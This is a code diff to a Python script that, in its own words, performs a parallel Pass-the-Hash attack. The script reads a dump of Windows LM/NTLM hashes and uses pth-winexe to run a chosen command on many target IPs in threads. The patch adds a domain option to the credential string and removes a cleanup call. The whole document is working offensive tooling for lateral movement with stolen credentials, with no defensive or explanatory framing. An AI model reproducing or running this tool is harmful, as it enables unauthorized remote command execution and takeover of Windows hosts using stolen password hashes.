@@ -25,6 +25,11 @@ def current_date_time():
 def get_arguments():
     parser = ArgumentParser(
         description='Perform a parallel Passing-the-Hash attack on the given target(s).')
+    parser.add_argument('--domain',
+                        dest='domain',
+                        default='',
+                        required=False,
+                        help='The network domain to use while attempting to pass the user\'s hash')
     parser.add_argument('--hashdump',
                         dest='hashdump',
                         required=True,
@@ -97,18 +102,18 @@ class WindowsUserCredentials:
         self.ntlm_hash = chunks[3].upper()
 
 
-def pass_the_hash(ip, user_name, lm_hash, ntlm_hash, command, timeout):
+def pass_the_hash(domain, ip, user_name, lm_hash, ntlm_hash, command, timeout):
     try:
-        logging.debug('ATTEMPT - {user_name}%{lm_hash}:{ntlm_hash}//{ip} - {command}'
-                      .format(user_name=user_name,
+        logging.debug('ATTEMPT - {domain}{user_name}%{lm_hash}:{ntlm_hash}//{ip} - {command}'
+                      .format(domain=domain,
+                              user_name=user_name,
                               lm_hash=lm_hash,
                               ntlm_hash=ntlm_hash,
                               ip=ip,
                               command=command))
-        os.environ['SMBHASH'] = '{lm_hash}:{ntlm_hash}'.format(
+        result = shell(['pth-winexe', '-U', domain + user_name + '%' + '{lm_hash}:{ntlm_hash}'.format(
             lm_hash=lm_hash,
-            ntlm_hash=ntlm_hash)
-        result = shell(['pth-winexe', '-U', user_name + '%', '//' + ip, command],
+            ntlm_hash=ntlm_hash), '//' + ip, command],
                        stderr=open(os.devnull, 'w'),
                        timeout=timeout)
         logging.info('{user_name}%{lm_hash}:{ntlm_hash}//{ip} - {result}'
@@ -118,15 +123,17 @@ def pass_the_hash(ip, user_name, lm_hash, ntlm_hash, command, timeout):
                              ip=ip,
                              result=result))
     except Exception as e:
-        logging.debug("{user_name}%{lm_hash}:{ntlm_hash}//{ip} - {error}"
-                      .format(user_name=user_name,
+        logging.debug("{domain}{user_name}%{lm_hash}:{ntlm_hash}//{ip} - {error}"
+                      .format(domain=domain,
+                              user_name=user_name,
                               lm_hash=lm_hash,
                               ntlm_hash=ntlm_hash,
                               ip=ip,
                               error=e))
 
 
-def create_parallel_jobs(ip_addresses,
+def create_parallel_jobs(domain,
+                         ip_addresses,
                          hashdump,
                          command,
                          timeout=DEFAULT_SOCKET_TIMEOUT_IN_SECONDS,
@@ -136,6 +143,8 @@ def create_parallel_jobs(ip_addresses,
     hashed_credentials = [WindowsUserCredentials(line) for line in hashdump]
     logging.info('{len} users have been given for the pth'
                  .format(len=len(hashed_credentials)))
+    if domain:
+        domain = domain + '/'
     for credential in hashed_credentials:
         user_name = credential.username
         logging.info('Passing the hash of {user_name}'
@@ -150,7 +159,8 @@ def create_parallel_jobs(ip_addresses,
                         threads.remove(thread)
             try:
 
-                thread = Thread(target=pass_the_hash, args=(ip,
+                thread = Thread(target=pass_the_hash, args=(domain,
+                                                            ip,
                                                             user_name,
                                                             lm_hash,
                                                             ntlm_hash,
@@ -159,8 +169,9 @@ def create_parallel_jobs(ip_addresses,
                 thread.start()
                 threads.append(thread)
             except Exception as e:
-                logging.debug("{user_name}%{lm_hash}:{ntlm_hash}//{ip} - {error}"
-                              .format(user_name=user_name,
+                logging.debug("{domain}{user_name}%{lm_hash}:{ntlm_hash}//{ip} - {error}"
+                              .format(domain=domain,
+                                      user_name=user_name,
                                       lm_hash=lm_hash,
                                       ntlm_hash=ntlm_hash,
                                       ip=ip,
@@ -191,14 +202,15 @@ try:
         ip_addresses = []
     logging.info('Parallel Passing-the-Hash attack started at {now}'.format(now=current_date_time()))
     hashdump = read_file(options.hashdump)
-    create_parallel_jobs(ip_addresses=ip_addresses,
-                         hashdump=hashdump,
-                         command=options.cmd,
-                         timeout=int(options.timeout),
-                         thread_limit=int(options.threads),
-                         sleep_timer_in_seconds=int(options.sleep))
+    create_parallel_jobs(
+        domain=options.domain,
+        ip_addresses=ip_addresses,
+        hashdump=hashdump,
+        command=options.cmd,
+        timeout=int(options.timeout),
+        thread_limit=int(options.threads),
+        sleep_timer_in_seconds=int(options.sleep))
     logging.info('Parallel Passing-the-Hash attack finished at {now}'.format(now=current_date_time()))
-    shell(['killall', 'python3'])
 except Exception as e:
     logging.error(e)
     exit(1)
